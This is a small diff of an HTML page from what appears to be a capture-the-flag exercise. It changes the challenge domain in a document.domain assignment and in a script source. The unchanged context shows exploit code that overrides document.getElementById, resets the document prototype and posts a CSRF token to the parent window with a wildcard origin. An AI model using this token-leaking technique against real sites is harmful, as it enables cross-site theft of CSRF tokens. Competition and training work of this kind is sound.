@@ -9,10 +9,11 @@
       top.postMessage(window._csrf.value, '*');
     }
     document.__proto__ = {};
-    document.domain = 'assn.anctf.tk';
+    document.domain = 'assn-ctf.drstra.in';
     document.getElementById = () => window._csrf;
   </script>
-  <script src="https://assn.anctf.tk/getSettings.js" defer onload="main()">
+  <script src="https://assn-ctf.drstra.in/getSettings.js" defer onload="main()">
   </script>
 </body>
+
 </html>
